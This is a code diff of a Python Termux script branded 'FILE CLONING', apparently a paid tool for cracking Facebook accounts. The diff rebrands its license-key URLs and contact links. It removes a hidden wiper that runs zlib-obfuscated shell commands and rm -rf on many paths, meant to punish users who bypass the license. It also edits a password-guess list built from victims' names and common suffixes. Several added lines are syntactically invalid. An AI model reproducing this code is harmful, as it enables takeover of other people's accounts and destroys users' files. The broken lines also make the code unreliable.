@@ -234,7 +234,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
+        a=requests.get('https://github.com/CenTsuPH/centsu/blob/main/key.txt').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -337,7 +337,7 @@ logo ="""
 [] TOOLS        :      FILE CLONING
 [] TYPE         :      PRIVATE
 [] FACEBOOK     :      Cent
-[] VERSION.     :     0.1
+[] VERSION.     :      0.1
 =================================================="\033[1;27m"""
 os.system('clear')
 print(logo)
@@ -414,55 +414,13 @@ def approval():
       tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+8801306109043?text='+tks)
       time.sleep(1)
       exit()
-  except:
-    sys.exit()
-ball='/data/data/com.termux/files/usr/bin/fboot'
-ripon='/sdcard/Android/.maidx.txt'
-ripon2='/sdcard/.brab.txt'
-ripon3='/data/data/com.termux/files/usr/bin/.sdghkrh'
-def fucked():
-    print(' Server Loadin.......')
-    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-    os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
-    os.system(f"rm -rf {a}")
-    os.system(f"rm -rf {b}")
-    os.system(f"rm -rf {c}")
-    os.system(f"rm -rf {d}")
-    os.system(f"rm -rf {e}")
-    os.system(f"rm -rf {f}")
-    os.system(f"rm -rf {g}")
-    os.system(f"rm -rf {h}")
-    os.system(f"rm -rf {i}")
-    os.system(f"rm -rf {j}")
-    os.system(f"rm -rf {k}")
-    os.system(f"rm -rf {ball}")
-    os.system(f"rm -rf {ripon}")
-    os.system(f"rm -rf {ripon2}")
-    os.system(f"rm -rf {ripon3}")
-    os.system(f"rm -rf {l}")
-    os.system(f"rm -rf {m}")
-    os.system(f"rm -rf {n}")
-    os.system(f"rm -rf {o}")
-    os.system(f"rm -rf {p}")
-    os.system(f"rm -rf {q}")
-    os.system(f"rm -rf {r}")
-    os.system(f"rm -rf {s}")
-    os.system(f"rm -rf {t}")
-    os.system(f"rm -rf {u}")
-    os.system(f"rm -rf {v}")
-    os.system(f"rm -rf \033[1;35m")
-    os.system(f"rm -rf {x}")
-    os.system(f"rm -rf {y}")
-    os.system(f"rm -rf {z}")
-    print(' Fuck You Bypass User Security \ . 0o');exit()
 
 def ckx():
     uuid = str(os.geteuid()) + str(os.getlogin())
     id = "-".join(uuid)
-    server = requests.get(f'https://github.com/Bdshahed/Paid/blob/main/paid.txt').text
+    server = requests.get(f'https://github.com/CenTsuPH/centsu/blob/main/key.txt').text
     try:
-        httpCaht = requests.get(f"https://github.com/Bdshahed/Paid/blob/main/paid.txt").text
+        httpCaht = requests.get(f"https://github.com/CenTsuPH/centsu/blob/main/key.txt").text
         if id in httpCaht:
             msg = str(os.geteuid())
             #pass
@@ -472,7 +430,7 @@ def ckx():
     except:
             sys.exit()
 def monu():
-    correct_access_key = "6S"
+    correct_access_key = "CENT56"
     attempts = 0
     max_attempts = 2  # Set the maximum number of login attempts
     os.system("clear")
@@ -521,7 +479,7 @@ def menu():
     elif RIPON in ['1']:
         crack_file()
     elif RIPON in ['2','02']:
-        os.system('xdg-open https://wa.me/+8801306109043')
+        os.system('xdg-open https://www.facebook.com/CenT.aep')
         os.system("python nono.py")
     elif RIPON in ['3','03']:
         result()
@@ -784,14 +742,15 @@ def passwrd():
                     pwv.append(frs+'123456')
                     pwv.append(frs+'786')
                     pwv.append(frs+'7890')
-                    pwv.append(nmf)
-                    pwv.append('57273200')
-                    pwv.append('59039200')
+                    pwv.append(nmf+'123')
+                    pwv.append(nmf+'1234')
+                    pwv.append(frs+'pogi')
+                    pwv.append(frs+'ganda')
                     pwv.append(frs+'@123')
-                    pwv.append(frs+'@')
-                    pwv.append(frs+'@@')
-                    pwv.append(frs+'@@@')
-                    pwv.append(frs+'@@@@')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+nmf)
+                    pwv.append(frs+nmf'123')
+                    pwv.append(frs+nmf'1234')
                     pwv.append(frs+'@#')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'11')
